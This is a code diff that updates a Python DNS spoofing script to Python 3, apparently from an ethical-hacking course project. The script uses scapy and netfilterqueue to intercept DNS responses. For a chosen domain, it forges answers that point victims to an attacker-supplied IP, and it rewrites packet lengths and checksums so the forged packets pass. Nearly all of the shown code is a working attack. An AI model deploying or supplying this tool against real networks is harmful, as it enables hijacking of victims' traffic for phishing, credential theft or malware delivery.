@@ -26,7 +26,7 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.DNSRR):  # check packet fields list => DNSRR stands for dns response record
         qname = scapy_packet[scapy.DNSRR].qname # syntax => var[module.field].subfield
 
-        if url in qname:
+        if url.encode() in qname:
 
             answer = scapy.DNSRR(rrname=qname, rdata=attacker_ip)  # creates a DNSRR response to be send to the
             # target machine
@@ -40,7 +40,7 @@ def process_packet(packet):
             del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
 
-            packet.set_payload(str(scapy_packet))  # modifies original package with forged one
+            packet.set_payload(bytes(scapy_packet))  # modifies original package with forged one
 
         # print(scapy_packet.show())
 
@@ -65,7 +65,9 @@ parsed_options = get_arguments()
 url = parsed_options.url
 attacker_ip = parsed_options.attacker_ip
 
-
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)  # 0 STANDS FOR THE QUEUE NUMBER
-queue.run()
+try:
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packet)  # 0 STANDS FOR THE QUEUE NUMBER
+    queue.run()
+except KeyboardInterrupt:
+    print("[*] Exiting program...")
